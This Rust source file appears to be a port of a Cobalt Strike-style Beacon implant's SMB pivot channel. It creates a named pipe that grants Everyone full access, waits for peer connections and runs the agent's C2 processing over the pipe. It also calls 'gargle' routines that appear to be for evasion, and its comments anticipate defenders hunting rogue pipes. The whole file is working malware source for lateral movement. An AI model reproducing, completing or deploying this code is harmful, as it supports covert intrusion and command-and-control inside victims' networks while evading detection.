//! Port of client_smb.cpp — Manage the SMB data channel for Beacon.
//!
//! Entry point:
//! 1. `command_link_wait` — user requested SMB data channel
//! 2. `smb_init` — create our named pipe with a null ACL
//! 3. `smb_wait` — wait for a connection... send agent id when it comes
//! 4. `client_process` — process server data please... do normal beacon stuff.
//!
//! The named pipe is created with a security descriptor that grants Everyone
//! full access (the DACL is built with the advapi32 ACL APIs).

use crate::beacon::SETTING_PIPENAME;
use crate::callback::post_error_d;
use crate::client::{client_init, client_process, client_stop, MAX_GET};
use crate::link::{lchannel_smb, LChannel};
use crate::settings::setting_ptr;
use crate::state;
use parking_lot::Mutex;
use windows_sys::Win32::Foundation::{
    CloseHandle, GetLastError, LocalFree, ERROR_PIPE_CONNECTED, HANDLE, INVALID_HANDLE_VALUE,
};
use windows_sys::Win32::Security::{
    AllocateAndInitializeSid, FreeSid, InitializeSecurityDescriptor, SetSecurityDescriptorDacl,
    ACL, NO_INHERITANCE, PSECURITY_DESCRIPTOR, PSID, SECURITY_ATTRIBUTES,
    SECURITY_WORLD_SID_AUTHORITY,
};
use windows_sys::Win32::Storage::FileSystem::{
    FlushFileBuffers, PIPE_ACCESS_DUPLEX, SPECIFIC_RIGHTS_ALL, STANDARD_RIGHTS_ALL,
};
use windows_sys::Win32::System::Memory::{LocalAlloc, LPTR};
use windows_sys::Win32::System::Pipes::{
    ConnectNamedPipe, CreateNamedPipeA, DisconnectNamedPipe, PIPE_READMODE_MESSAGE,
    PIPE_TYPE_MESSAGE, PIPE_UNLIMITED_INSTANCES,
};
use windows_sys::Win32::System::SystemServices::{
    SECURITY_DESCRIPTOR_REVISION, SECURITY_WORLD_RID,
};

/// Our named pipe handle (client_smb.cpp `static HANDLE pipe`).
static PIPE: Mutex<isize> = Mutex::new(0);

// ---------------------------------------------------------------------------
// The `Win32_Security_Authorization` Cargo feature is not enabled in this
// crate, so the EXPLICIT_ACCESS/TRUSTEE types and SetEntriesInAcl are declared
// locally. The definitions below mirror the windows-sys bindings exactly.
// ---------------------------------------------------------------------------

/// SECURITY_DESCRIPTOR_MIN_LENGTH from the Windows SDK (not in windows-sys).
const SECURITY_DESCRIPTOR_MIN_LENGTH: usize = 20;

#[allow(non_camel_case_types)]
type ACCESS_MODE = i32;
#[allow(non_camel_case_types)]
type TRUSTEE_FORM = i32;
#[allow(non_camel_case_types)]
type TRUSTEE_TYPE = i32;
#[allow(non_camel_case_types)]
type MULTIPLE_TRUSTEE_OPERATION = i32;

const SET_ACCESS: ACCESS_MODE = 2;
const TRUSTEE_IS_SID: TRUSTEE_FORM = 0;
const TRUSTEE_IS_WELL_KNOWN_GROUP: TRUSTEE_TYPE = 5;

#[repr(C)]
#[derive(Clone, Copy)]
struct TRUSTEE_A {
    p_multiple_trustee: *mut TRUSTEE_A,
    multiple_trustee_operation: MULTIPLE_TRUSTEE_OPERATION,
    trustee_form: TRUSTEE_FORM,
    trustee_type: TRUSTEE_TYPE,
    ptstr_name: *mut u8,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct EXPLICIT_ACCESS_A {
    grf_access_permissions: u32,
    grf_access_mode: ACCESS_MODE,
    grf_inheritance: u32,
    trustee: TRUSTEE_A,
}

#[link(name = "advapi32")]
unsafe extern "system" {
    fn SetEntriesInAclA(
        ccountofexplicitentries: u32,
        plistofexplicitentries: *const EXPLICIT_ACCESS_A,
        oldacl: *const ACL,
        newacl: *mut *mut ACL,
    ) -> u32; // WIN32_ERROR
}

/// `PIPE_PERM_OBJECTS` from client_smb.cpp.
struct PipePermObjects {
    p_everyone_sid: PSID,
    p_acl: *mut ACL,
    p_sd: PSECURITY_DESCRIPTOR,
}

impl PipePermObjects {
    fn nulled() -> Self {
        PipePermObjects {
            p_everyone_sid: std::ptr::null_mut(),
            p_acl: std::ptr::null_mut(),
            p_sd: std::ptr::null_mut(),
        }
    }
}

/* call our gargle function */
unsafe extern "C" fn link_channel_smb_wait(thisp: *mut core::ffi::c_void) {
    let inst = &mut *(thisp as *mut LChannel);
    crate::gargle_pivot_smb::gargle_block_pipe(inst.pipe);
}

/* create a new kind of channel */
fn lchannel_smb_gargle(pipe: isize) -> LChannel {
    let mut channel = lchannel_smb(pipe);
    channel.wait = Some(link_channel_smb_wait);
    channel
}

/*
* wait for a connection to our named pipe
*/
fn smb_wait() {
    let pipe = *PIPE.lock();
    if !crate::gargle_pivot_smb::gargle_pipe_wait(pipe) {
        /* plan B */
        let mut f_connected = 0u32;

        /* wait for a connection to our pipe */
        while f_connected == 0 {
            let ok = unsafe { ConnectNamedPipe(pipe as HANDLE, std::ptr::null_mut()) };
            f_connected = if ok != 0 {
                1
            } else if unsafe { GetLastError() } == ERROR_PIPE_CONNECTED {
                1
            } else {
                0
            };
        }
    }

    /* OK, kick off our client init routine. */
    client_init(lchannel_smb_gargle(pipe));
}

/*
 * change pipe permissions
 * https://docs.microsoft.com/en-us/windows/win32/secauthz/creating-a-security-descriptor-for-a-new-object-in-c--?redirectedfrom=MSDN
 */
fn setup_pipe_perms(ppo: &mut PipePermObjects, psa: &mut SECURITY_ATTRIBUTES) -> bool {
    let sid_auth_world = SECURITY_WORLD_SID_AUTHORITY;

    // Create a well-known SID for the Everyone group.
    if unsafe {
        AllocateAndInitializeSid(
            &sid_auth_world,
            1,
            SECURITY_WORLD_RID as u32,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            &mut ppo.p_everyone_sid,
        )
    } == 0
    {
        return false;
    }

    // Initialize an EXPLICIT_ACCESS structure for an ACE.
    // The ACE will allow Everyone read access to the key.
    let mut ea: [EXPLICIT_ACCESS_A; 1] = unsafe { std::mem::zeroed() };
    ea[0].grf_access_permissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
    ea[0].grf_access_mode = SET_ACCESS;
    ea[0].grf_inheritance = NO_INHERITANCE;
    ea[0].trustee.trustee_form = TRUSTEE_IS_SID;
    ea[0].trustee.trustee_type = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea[0].trustee.ptstr_name = ppo.p_everyone_sid as *mut u8;

    // Create a new ACL that contains the new ACEs.
    let dwres = unsafe { SetEntriesInAclA(1, ea.as_ptr(), std::ptr::null(), &mut ppo.p_acl) };
    if dwres != 0
    /* ERROR_SUCCESS */
    {
        return false;
    }

    // Initialize a security descriptor.
    ppo.p_sd = unsafe { LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH) };
    if ppo.p_sd.is_null() {
        return false;
    }

    if unsafe { InitializeSecurityDescriptor(ppo.p_sd, SECURITY_DESCRIPTOR_REVISION) } == 0 {
        return false;
    }

    // Add the ACL to the security descriptor.
    if unsafe { SetSecurityDescriptorDacl(ppo.p_sd, 1, ppo.p_acl, 0) } == 0 {
        return false;
    }

    // Initialize a security attributes structure.
    psa.nLength = std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32;
    psa.lpSecurityDescriptor = ppo.p_sd;
    psa.bInheritHandle = 0;

    true
}

/* TODO: see how this is called to clean up. done on exit? */
fn cleanup_pipe_perms(ppo: &mut PipePermObjects) {
    if !ppo.p_everyone_sid.is_null() {
        unsafe {
            FreeSid(ppo.p_everyone_sid);
        }
    }
    if !ppo.p_acl.is_null() {
        unsafe {
            LocalFree(ppo.p_acl as *mut core::ffi::c_void);
        }
    }
    if !ppo.p_sd.is_null() {
        unsafe {
            LocalFree(ppo.p_sd);
        }
    }
}

/*
 * This function is unused, but is here in case we opt to introduce DACL flexibility
 * when folks start using the DACL to conduct hunts for rogue pipes.
 */
#[allow(dead_code)] // mirrors the C++ unused helper
fn setup_pipe_perms_null(ppo: &mut PipePermObjects, psa: &mut SECURITY_ATTRIBUTES) -> bool {
    /* null out the fields and pointers */
    *ppo = PipePermObjects::nulled();

    /* allocate our security descriptor structure */
    ppo.p_sd = unsafe { LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH) };

    /* setup everything up */
    unsafe {
        InitializeSecurityDescriptor(ppo.p_sd, SECURITY_DESCRIPTOR_REVISION);
        SetSecurityDescriptorDacl(ppo.p_sd, 1, std::ptr::null(), 0);
    }
    psa.nLength = std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32;
    psa.lpSecurityDescriptor = ppo.p_sd;
    psa.bInheritHandle = 0;

    true
}

/*
*  init a named pipe
*/
pub fn smb_init() -> bool {
    let mut ppo = PipePermObjects::nulled();

    /* null security attributes -- allows anyone to connect */
    let mut sa: SECURITY_ATTRIBUTES = unsafe { std::mem::zeroed() };

    /* setup our named pipe security attributes */
    setup_pipe_perms(&mut ppo, &mut sa);

    /* setup our named pipe please */
    let mut pipename = setting_ptr(SETTING_PIPENAME).unwrap_or(b"").to_vec();
    if !pipename.ends_with(&[0]) {
        pipename.push(0);
    }
    let temps = unsafe {
        CreateNamedPipeA(
            pipename.as_ptr(),
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE,
            PIPE_UNLIMITED_INSTANCES,
            MAX_GET as u32,
            MAX_GET as u32,
            0,
            &sa,
        )
    };

    /* we're done with these pointers, so let's clean them up */
    cleanup_pipe_perms(&mut ppo);

    /* check for errors and fail now... */
    if temps == INVALID_HANDLE_VALUE {
        post_error_d(0x17, unsafe { GetLastError() } as i32);
        return false;
    }

    /* set post type to POST_SMB now... since everything seems OK */
    state::set_post_type(crate::commands::POST_SMB);

    /* now we can assign the handle */
    *PIPE.lock() = temps as isize;
    true
}

/* stop everything */
fn smb_stop() {
    /* OK, shut everything down! */
    unsafe {
        CloseHandle(*PIPE.lock() as HANDLE);
    }

    /* clean up the resources with our last go */
    client_stop();
}

/*
* put this beacon into a mode where it's waiting for a connection to its pipe
*/
pub fn command_link_wait() {
    /* setup our SMB server */
    if !smb_init() {
        return;
    }

    /* while we are an SMB server... do this stuff */
    while state::sleep_time() > 0 {
        /* wait for a connection and send our agent id */
        smb_wait();

        /* process data */
        client_process();

        /* close the session */
        let pipe = *PIPE.lock();
        unsafe {
            FlushFileBuffers(pipe as HANDLE);
            DisconnectNamedPipe(pipe as HANDLE);
        }
    }

    /* we're no longer an SMB server... stop the shenanigans */
    smb_stop();

    /* just kill the process... it's this or crash */
    crate::thread::safe_exit();
}

/// `connect_pipe` lives in jobs.cpp (ported to jobs.rs); re-export it so
/// `crate::client_smb::connect_pipe` resolves for SMB link callers.
pub use crate::jobs::connect_pipe;
